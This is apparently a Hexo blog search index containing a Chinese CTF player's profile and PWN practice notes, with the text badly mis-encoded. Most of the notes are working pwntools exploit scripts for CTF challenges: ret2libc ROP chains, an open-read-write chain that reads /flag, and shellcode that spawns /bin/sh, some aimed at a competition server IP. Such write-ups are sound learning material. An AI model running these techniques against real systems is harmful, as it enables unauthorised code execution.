<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å…³äºæˆ‘</title>
      <link href="/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/"/>
      <url>/2025/03/27/%E5%85%B3%E4%BA%8E%E6%88%91/</url>
      
        <content type="html"><![CDATA[<h1 id="å…³äºæˆ‘"><a href="#å…³äºæˆ‘" class="headerlink" title="å…³äºæˆ‘"></a>å…³äºæˆ‘</h1><h3 id="è¿›å¾·ä¿®ä¸šï¼Œå¿—é“é¼æ–°-CTF-dream-itâ€™s-mygo"><a href="#è¿›å¾·ä¿®ä¸šï¼Œå¿—é“é¼æ–°-CTF-dream-itâ€™s-mygo" class="headerlink" title="è¿›å¾·ä¿®ä¸šï¼Œå¿—é“é¼æ–°$CTF\ dream,itâ€™s\ mygo!!!!!$"></a>è¿›å¾·ä¿®ä¸šï¼Œå¿—é“é¼æ–°<br>$CTF\ dream,itâ€™s\ mygo!!!!!$</h3><hr><h3 id="ç¬”è€…"><a href="#ç¬”è€…" class="headerlink" title="ç¬”è€…"></a>ç¬”è€…</h3><p>å¸¸ç”¨ID: <strong>Zechariah</strong>(æ­£å¸¸å½¢æ€) &amp; <strong>Cucumber</strong>(æ°´ç¾¤å½¢æ€)&amp; <strong>Ahrichaze</strong>(äºŒè¿›åˆ¶å½¢æ€)(å‡ ä¸ªidéƒ½æ˜¯æˆ‘æœ¬äººæğŸ˜Š)</p><p>ç¬”è€…æ˜¯ä¸€åæ¥è‡ªNJUSTçš„23çº§ç½‘å®‰æœ¬ç§‘ç”Ÿï¼ŒåŒæ—¶ä¹Ÿæ˜¯CTFerã€‚</p><p>å¤§ä¸€å­¦å¹´å¯¹å¯†ç å­¦å¾ˆæ„Ÿå…´è¶£ï¼ˆåšå®¢æ—©æœŸæœ‰ä¸€äº›å¯†ç å­¦æ•°å­¦åŸºç¡€çŸ¥è¯†ï¼‰</p><p>ä¸è¿‡ç°åœ¨å·²ç»æ²‰è¿·äºŒè¿›åˆ¶äº†ï¼Œæƒ³å½“PWN Kingï¼Œä¸è¿‡å¤§äºŒä¸Šå­¦æœŸè¿‡äº†ä¸€åŠæ‰èµ·æ­¥ï¼Œç°åœ¨è¿˜æ˜¯ä¸ªPWNå®å®ğŸ˜­</p><blockquote><p>PSï¼šæœ‰ä¿®æ”¹å»ºè®®çš„è¯å¯ä»¥å‘é‚®ä»¶ email: <strong>Cucumber0703@outlook.com</strong></p></blockquote><hr><h3 id="ç«èµ›ç»å†"><a href="#ç«èµ›ç»å†" class="headerlink" title="ç«èµ›ç»å†"></a>ç«èµ›ç»å†</h3><h4 id="NJUST"><a href="#NJUST" class="headerlink" title="NJUST"></a>NJUST</h4><ul><li>æ–°ç”Ÿèµ›-23å¹´10æœˆ-<strong>äºŒç­‰å¥–</strong></li><li>æ ¡èµ›-24å¹´5æœˆ-<strong>å† å†›ï¼ˆä¸€ç­‰å¥–ï¼‰</strong></li></ul><h4 id="ä¸­å›½ç§»åŠ¨ç½‘ç»œå®‰å…¨æ–°æ‰‹æŠ€èƒ½èµ›"><a href="#ä¸­å›½ç§»åŠ¨ç½‘ç»œå®‰å…¨æ–°æ‰‹æŠ€èƒ½èµ›" class="headerlink" title="ä¸­å›½ç§»åŠ¨ç½‘ç»œå®‰å…¨æ–°æ‰‹æŠ€èƒ½èµ›"></a>ä¸­å›½ç§»åŠ¨ç½‘ç»œå®‰å…¨æ–°æ‰‹æŠ€èƒ½èµ›</h4><ul><li>åˆèµ›-23å¹´11æœˆ-<strong>å¸‚10åå·¦å³</strong></li><li>å†³èµ›-23å¹´12æœˆ-<strong>çœ92å</strong></li></ul><h4 id="é•¿äº­ç§‘æŠ€â€”â€”Real-World-CTF"><a href="#é•¿äº­ç§‘æŠ€â€”â€”Real-World-CTF" class="headerlink" title="é•¿äº­ç§‘æŠ€â€”â€”Real_World_CTF"></a>é•¿äº­ç§‘æŠ€â€”â€”Real_World_CTF</h4><ul><li>ä¼ä¸šèµ›é“ä½“éªŒèµ›-24å¹´1æœˆ-<strong>ä¸€ç­‰å¥–</strong>ï¼ˆå—å½“åœ°ä¼ä¸šæµ·æ¾œç§‘æŠ€é‚€è¯·å‚èµ›ï¼‰</li></ul><h4 id="é•¿åŸæ¯-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹"><a href="#é•¿åŸæ¯-ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹" class="headerlink" title="é•¿åŸæ¯ ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹"></a>é•¿åŸæ¯ ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹</h4><ul><li>åˆèµ›-24å¹´3æœˆ-çº¿ä¸Š-<strong>55/250ï¼Ÿ</strong>å</li><li>åŠå†³èµ›-24å¹´4æœˆ-å¹¿å·-å¹¿å·å¤§å­¦-<strong>ç¬¬ä¸‰èµ›åŒºåŒºåŸŸèµ›ä¸‰ç­‰å¥–</strong>â€”â€”<strong>å¥–é‡‘ è‚†ä»Ÿå…ƒ</strong><ul><li>å½“æ—¶åœ¨å¹¿å·é‡åˆ°å¤©ç¾ï¼Œé“è·¯éƒ½æ–­äº†ï¼Œé«˜é“ä¸Šçš„æˆ‘ä»¬å·®ç‚¹æˆä¸ºè¿·å¤±ä¹˜å®¢</li></ul></li></ul><h4 id="è‹å¯†æ¯-æ±Ÿè‹çœå¯†ç è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›"><a href="#è‹å¯†æ¯-æ±Ÿè‹çœå¯†ç è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›" class="headerlink" title="è‹å¯†æ¯/æ±Ÿè‹çœå¯†ç è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›"></a>è‹å¯†æ¯/æ±Ÿè‹çœå¯†ç è¡Œä¸šèŒä¸šæŠ€èƒ½ç«èµ›</h4><ul><li>åˆèµ›-24å¹´10æœˆ-æ— é”¡-æ— é”¡å­¦é™¢-<strong>çœå‰20</strong></li><li>å†³èµ›-24å¹´10æœˆ-æ— é”¡-æ— é”¡å­¦é™¢-<strong>å† å†›ï¼ˆä¸€ç­‰å¥–-å­¦ç”Ÿç»„ç¬¬ä¸€åï¼‰</strong>â€”â€”<strong>å¥–é‡‘ å£¹ä¸‡å…ƒ</strong></li></ul><h4 id="ç½‘é¼æ¯-ç½‘ç»œå®‰å…¨å¤§èµ›-å…¬å®‰éƒ¨-é’é¾™ç»„"><a href="#ç½‘é¼æ¯-ç½‘ç»œå®‰å…¨å¤§èµ›-å…¬å®‰éƒ¨-é’é¾™ç»„" class="headerlink" title="ç½‘é¼æ¯ ç½‘ç»œå®‰å…¨å¤§èµ›(å…¬å®‰éƒ¨) é’é¾™ç»„"></a>ç½‘é¼æ¯ ç½‘ç»œå®‰å…¨å¤§èµ›(å…¬å®‰éƒ¨) é’é¾™ç»„</h4><ul><li>åˆèµ›-24å¹´10æœˆ-çº¿ä¸Š-<strong>161/2390</strong>å</li><li>åŠå†³èµ›-24å¹´11æœˆ-è´µå·-å›½é™…ä¼šå±•ä¸­å¿ƒ-<strong>ç½‘é¼ä¹‹æ˜Ÿ</strong><ul><li>è´µé˜³æ˜¯ä¸ªå¾ˆå¥½åƒçš„åœ°æ–¹</li></ul></li></ul><h4 id="ç¬¬18å±Šå…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›-è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›"><a href="#ç¬¬18å±Šå…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›-è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›" class="headerlink" title="ç¬¬18å±Šå…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›-è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›"></a>ç¬¬18å±Šå…¨å›½å¤§å­¦ç”Ÿè½¯ä»¶åˆ›æ–°å¤§èµ›-è½¯ä»¶ç³»ç»Ÿå®‰å…¨èµ›</h4><ul><li>åä¸œåˆèµ›-24å¹´12æœˆ-çº¿ä¸Š-<strong>åä¸œ11/253å</strong></li><li>åä¸œåŒºåŸŸèµ›-25å¹´3æœˆ-å—äº¬ä¿¡æ¯å·¥ç¨‹å¤§å­¦-<strong>15/77å</strong></li><li>å…¨å›½å†³èµ›-25å¹´5æœˆ-<strong>å¾…å®š</strong></li></ul><h4 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h4><ul><li><p>ä»æˆ‘å…¥å­¦å¼€å§‹ï¼Œå…¨æ ¡æ‰“CTFçš„åŠ èµ·æ¥ä¸è¶…è¿‡7ä¸ªï¼Œå¾ˆéš¾å‡‘é½å®Œæ•´çš„å›½èµ›é˜Ÿä¼ğŸ˜­ï¼Œå¹¶æ²¡æœ‰å–å¾—å¤ªå¥½çš„æˆç»©ï¼Œ</p><p>æœªæ¥ä¸¤å¹´ä½œä¸ºé¦–å‘æˆå‘˜ï¼Œå¸Œæœ›èƒ½å¤Ÿåˆ›é€ å­¦æ ¡å†å²ï¼Œè¿›ä¸€æ¬¡å†³èµ›ï¼</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWNåˆ·é¢˜ç¬”è®°ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</title>
      <link href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="GHCTF"><a href="#GHCTF" class="headerlink" title="GHCTF"></a>GHCTF</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h3><p>ç»•PIE<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level&#x3D;&#39;debug&#39;p &#x3D; process(&#39;.&#x2F;attachment&#39;)offset&#x3D;40backdoor &#x3D; b&quot;\xC5&quot;payload &#x3D; b&quot;A&quot; * offset + backdoorp.send(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250314192604.png" alt="Pasted image 20250314192604"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] p&#x3D;process(&quot;.&#x2F;attachment&quot;)elf&#x3D;ELF(&#39;.&#x2F;attachment&#39;)libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)def manu(choice):    p.sendlineafter(&#39;money\n&#39;,str(choice))def flowers(kind,num):    manu(1)    p.sendlineafter(&#39;20\n&#39;,str(kind))    &#39;&#39;&#39;    1.peony $10    2.rose $100    3.fragrans $20    &#39;&#39;&#39;    p.sendlineafter(&#39;buy?\n&#39;,str(num))def hell_money(count):        p.sendline(b&#39;3&#39;)        p.sendline(str(count).encode(&#39;utf-8&#39;))def see_it(count):        p.sendline(b&#39;7&#39;)        p.sendline(str(count).encode(&#39;utf-8&#39;))hell_money(100)pause()see_it(10000)pause()p.sendline(b&#39;5&#39;)#0x0000000000400579 : retret&#x3D;0x0000000000400579pop_rdi &#x3D; 0x0000000000400d73puts_plt &#x3D; elf.plt[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]main &#x3D; 0x0000000000400B1Epayload &#x3D; b&#39;A&#39;*0x48  +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)pause()p.sendline(payload)pause()p.recvuntil(b&#39;it!!!\n&#39;)puts_addr &#x3D; p.recvline()[:6]puts_addr &#x3D; u64(puts_addr.ljust(8,b&#39;\x00&#39;))libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]success(&#39;libc_base--&gt;&#39;+hex(libc_base))system &#x3D; libc_base + libc.symbols[&#39;system&#39;]binsh &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))success(&#39;system--&gt;&#39;+hex(system))payload &#x3D; b&#39;A&#39;*0x48  +p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)p.sendline(payload)pause()p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130300.png" alt="Pasted image 20250313130300"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130240.png" alt="Pasted image 20250313130240"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132719.png" alt="Pasted image 20250313132719"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132731.png" alt="Pasted image 20250313132731"><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313135230.png" alt="Pasted image 20250313135230"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] p&#x3D;process(&quot;.&#x2F;ret2libc2&quot;)elf&#x3D;ELF(&#39;.&#x2F;ret2libc2&#39;)libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)offset &#x3D; 0x30rbp_ret &#x3D; 0x40117dret &#x3D; 0x40101abss &#x3D; 0x4044e8printf&#x3D;0x401227payload1&#x3D;b&#39;A&#39;*(offset-5) + b&#39;%27$p&#39; + p64(bss+0x400)+p64(printf)p.sendlineafter(&#39;magic\n&#39;,payload1)p.recvuntil(b&#39;A&#39;*(offset-5))address&#x3D;p.recvuntil(b&#39;\xe8&#39;,drop&#x3D;True)address&#x3D;int(address,16)success(hex(address))libc_addr &#x3D; address - libc.symbols[&#39;__libc_start_main&#39;]-128success(hex(libc_addr))rdi&#x3D;0x2a3e5+libc_addrbinsh&#x3D;libc_addr + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))rsi&#x3D;0x2be51+libc_addrsystem&#x3D;libc.symbols[&#39;system&#39;]+libc_addrpayload &#x3D; b&#39;a&#39;*0x30+ p64(bss+0x500) payload+&#x3D; p64(rdi)+ p64(binsh)+ p64(system)p.sendafter(&#39;magic&#39;,payload)p.interactive()&#39;&#39;&#39;0xebc81 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, [rbp-0x70])constraints:  address rbp-0x78 is writable  [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL || r10 is a valid argv  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp0xebc85 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, rdx)constraints:  address rbp-0x78 is writable  [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL || r10 is a valid argv  [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL || rdx is a valid envp0xebc88 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsi, rdx)constraints:  address rbp-0x78 is writable  [rsi] &#x3D;&#x3D; NULL || rsi &#x3D;&#x3D; NULL || rsi is a valid argv  [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL || rdx is a valid envp0xebce2 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, r12)constraints:  address rbp-0x48 is writable  r13 &#x3D;&#x3D; NULL || &#123;&quot;&#x2F;bin&#x2F;sh&quot;, r13, NULL&#125; is a valid argv  [r12] &#x3D;&#x3D; NULL || r12 &#x3D;&#x3D; NULL || r12 is a valid envp0xebd38 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x48 is writable  r12 &#x3D;&#x3D; NULL || &#123;&quot;&#x2F;bin&#x2F;sh&quot;, r12, NULL&#125; is a valid argv  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp0xebd3f execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x48 is writable  rax &#x3D;&#x3D; NULL || &#123;rax, r12, NULL&#125; is a valid argv  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp0xebd43 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x50 is writable  rax &#x3D;&#x3D; NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hopper"><a href="#hopper" class="headerlink" title="hopper"></a>hopper</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250315150516.png" alt="Pasted image 20250315150516"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  p &#x3D; process(&#39;.&#x2F;Hopper&#39;)    pop_rsi &#x3D; 0x401017  syscall &#x3D; 0x40100A  xchg &#x3D; 0x40100C  pop_r15&#x3D;0x40101C    gdb.attach(p)  pause()  p.recvuntil(b&#39;    (&quot; ~----( ~   Y.  )\n&#39;)  a &#x3D; p.recvline()[:6]  a &#x3D; int.from_bytes(a,&#39;little&#39;)  print(&quot;---&gt;&quot;,hex(a))  payload &#x3D; p64(pop_r15)+p64(pop_rsi)+p64(0)  payload +&#x3D; p64(a+0x28) + p64(0)  payload +&#x3D; p64(59) + p64(syscall)  payload +&#x3D; p64(0x401021)+ b&#39;&#x2F;bin&#x2F;sh\x00&#39;  p.sendline(payload)  p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="NPC2CTF"><a href="#NPC2CTF" class="headerlink" title="NPC2CTF"></a><strong>NPC2CTF</strong></h2><h3 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h3><h4 id="ORWï¼ˆDay1-25-2-23ï¼‰"><a href="#ORWï¼ˆDay1-25-2-23ï¼‰" class="headerlink" title="ORWï¼ˆDay1 25/2/23ï¼‰"></a>ORWï¼ˆDay1 25/2/23ï¼‰</h4><p><a href="https://blog.csdn.net/2301_79880074/article/details/136008071">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ä¸¤ç§åˆ©ç”¨å§¿åŠ¿+orwæ²™ç›’åˆ©ç”¨_æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canary-CSDNåšå®¢</a><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x000000000002be51 : pop rsi ; ret0x0000000000035dd1 : pop rbx ; ret0x000000000002be51 : pop rsi ; ret0x0000000000045eb0 : pop rax ; ret0x000000000002a3e5 : pop rdi ; ret0x00000000000904a9 : pop rdx ; pop rbx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; |grep &quot;rax&quot;</code><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]  elf&#x3D;ELF(&#39;.&#x2F;orw&#39;)libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;)# p&#x3D;process(&#39;.&#x2F;orw&#39;)p&#x3D;remote(&#39;175.27.249.18&#39;,31548)p.recvuntil(&#39;0x&#39;)libc.address&#x3D;int(p.recv(12),16)-libc.sym[&#39;printf&#39;]log.success(&#39;libc &#x3D; &#39;+hex(libc.address))rsi&#x3D;0x000000000002be51+libc.addressrdi&#x3D;0x000000000002a3e5+libc.addressrdx_rbx&#x3D;0x00000000000904a9+libc.address&#39;&#39;&#39;0x000000000002be51 : pop rsi ; ret0x0000000000035dd1 : pop rbx ; ret0x0000000000045eb0 : pop rax ; ret0x00000000000904a9 : pop rdx ; pop rbx ; ret0x000000000002a3e5&#39;&#39;&#39;read&#x3D;libc.sym[&#39;read&#39;]puts&#x3D;libc.sym[&#39;puts&#39;]syscall&#x3D;libc.sym[&#39;syscall&#39;]bss&#x3D;0x403400payload&#x3D;b&#39;A&#39;*88#è°ƒç”¨read(0, bss_addr, 4)è¯»å…¥&quot;flag&quot;payload+&#x3D;p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(8)+p64(0)+p64(read)#è°ƒç”¨syscall(2,bss,0)payload+&#x3D;p64(rdi)+p64(2)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0)+p64(0)+p64(syscall)#read(3(æ–‡ä»¶), bss, 0x100)payload+&#x3D;p64(rdi)+p64(3)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x100)+p64(0)+p64(read)#puts(bss)payload+&#x3D;p64(rdi)+p64(bss)+p64(puts)p.sendline(payload)p.sendline(b&#39;&#x2F;flag\x00&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="simple-shellcodeï¼ˆDay0-25-2-22ï¼‰"><a href="#simple-shellcodeï¼ˆDay0-25-2-22ï¼‰" class="headerlink" title="simple_shellcodeï¼ˆDay0 25/2/22ï¼‰"></a>simple_shellcodeï¼ˆDay0 25/2/22ï¼‰</h4><h5 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)sh &#x3D; remote(&#39;175.27.249.18&#39;, 30369)shellcode &#x3D; asm(shellcraft.sh()) #ç”Ÿæˆå¹¶æ±‡ç¼–shellcodesh.sendafter(&#39;plz: &#39;, shellcode)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3from pwncli import *context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;, &quot;-l&quot;, &quot;122&quot;]local_flag &#x3D; sys.argv[1] if len(sys.argv) &#x3D;&#x3D; 2 else 0if local_flag &#x3D;&#x3D; &quot;remote&quot;:    addr &#x3D; &#39;175.27.249.18 30924&#39;    host &#x3D; addr.split(&#39; &#39;)    gift.io &#x3D; remote(host[0], host[1])    gift.remote &#x3D; Trueelse:    gift.io &#x3D; process(&#39;.&#x2F;pwn1&#39;)    if local_flag &#x3D;&#x3D; &quot;nodbg&quot;:        gift.remote &#x3D; Trueinit_x64_context(gift.io, gift)libc &#x3D; load_libc(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)elf &#x3D; gift.elf &#x3D; ELF(&#39;.&#x2F;pwn1&#39;)cmd &#x3D; &#39;&#39;&#39;&#39;&#39;&#39;launch_gdb(cmd)ru(b&#39;Shellcode plz: &#39;)shellcode &#x3D; &#39;&#39;&#39;pop raxpop raxadd qword ptr [rsp], 0x30mov rsp, qword ptr [rsp]mov rdi, 1mov rsi, 0x424030mov rdx, 0x8mov qword ptr [rbp + 0x8], 0x4011FAret&#39;&#39;&#39;leave_ret &#x3D; 0x4012CBpayload &#x3D; p64(elf.plt.write) + p64(leave_ret)s(asm(shellcode).ljust(0x30, b&#39;\x90&#39;) + payload)libc_base &#x3D; u64_ex(r(8)) - 0x11EA10set_current_libc_base_and_log(libc_base)shellcode &#x3D; f&#39;&#39;&#39;mov rdi, &#123;next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;)):#x&#125;mov rsi, &#123;libc.sym.system:#x&#125;add rsp, 0x8jmp rsi&#39;&#39;&#39;s(asm(shellcode))ia()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="EZ-Stackï¼ˆDay1-25-2-23ï¼‰"><a href="#EZ-Stackï¼ˆDay1-25-2-23ï¼‰" class="headerlink" title="EZ_Stackï¼ˆDay1 25/2/23ï¼‰"></a>EZ_Stackï¼ˆDay1 25/2/23ï¼‰</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250217193308.png" alt="Pasted image 20250217193308">å¼€äº†NX<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;ä¹Ÿè®¸æœ‰ç”¨çš„gadget0x000000000040117d : pop rbp ; ret0x0000000000401203 : pop rdi ; ret0x000000000040101a : ret0x000000000040103a : jmp 0x4010200x0000000000401194 : jmp 0x4011200x000000000040100b : jmp 0x4840103f0x0000000000401217 : jmp 0x484012290x000000000040110c : jmp rax0x000000000040101a : ret0x000000000040127f : leave ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250218214438.png" alt="Pasted image 20250218214438"></p><h5 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" 